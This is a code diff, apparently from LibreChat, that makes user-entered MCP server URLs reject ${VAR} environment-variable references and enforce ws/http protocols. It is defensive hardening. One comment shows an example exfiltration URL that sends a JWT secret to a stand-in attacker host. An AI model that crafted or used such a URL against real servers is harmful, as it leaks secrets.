@@ -223,6 +223,26 @@ const omitServerManagedFields = <T extends z.ZodObject<z.ZodRawShape>>(schema: T
     oauth_headers: true,
   });
 
+const envVarPattern = /\$\{[^}]+\}/;
+
+const isWsProtocol = (val: string): boolean => {
+  const { protocol } = new URL(val);
+  return protocol === 'ws:' || protocol === 'wss:';
+};
+
+/**
+ * Builds a URL schema for user input that rejects ${VAR} env variable patterns
+ * and validates protocol constraints without resolving environment variables.
+ */
+const userUrlSchema = (protocolCheck: (val: string) => boolean, message: string) =>
+  z
+    .string()
+    .refine((val) => !envVarPattern.test(val), {
+      message: 'Environment variable references are not allowed in URLs',
+    })
+    .pipe(z.string().url())
+    .refine(protocolCheck, { message });
+
 /**
  * MCP Server configuration that comes from UI/API input only.
  * Omits server-managed fields like startup, timeout, customUserVars, etc.
@@ -232,11 +252,24 @@ const omitServerManagedFields = <T extends z.ZodObject<z.ZodRawShape>>(schema: T
  * Stdio allows arbitrary command execution and should only be configured
  * by administrators via the YAML config file (librechat.yaml).
  * Only remote transports (SSE, HTTP, WebSocket) are allowed via the API.
+ *
+ * SECURITY: URL fields use userUrlSchema instead of the admin schemas'
+ * extractEnvVariable transform to prevent env variable exfiltration
+ * through user-controlled URLs (e.g. http://attacker.com/?k=${JWT_SECRET}).
  */
 export const MCPServerUserInputSchema = z.union([
-  omitServerManagedFields(WebSocketOptionsSchema),
-  omitServerManagedFields(SSEOptionsSchema),
-  omitServerManagedFields(StreamableHTTPOptionsSchema),
+  omitServerManagedFields(WebSocketOptionsSchema).extend({
+    url: userUrlSchema(isWsProtocol, 'WebSocket URL must start with ws:// or wss://'),
+  }),
+  omitServerManagedFields(SSEOptionsSchema).extend({
+    url: userUrlSchema((val) => !isWsProtocol(val), 'SSE URL must not start with ws:// or wss://'),
+  }),
+  omitServerManagedFields(StreamableHTTPOptionsSchema).extend({
+    url: userUrlSchema(
+      (val) => !isWsProtocol(val),
+      'Streamable HTTP URL must not start with ws:// or wss://',
+    ),
+  }),
 ]);
 
 export type MCPServerUserInput = z.infer<typeof MCPServerUserInputSchema>;
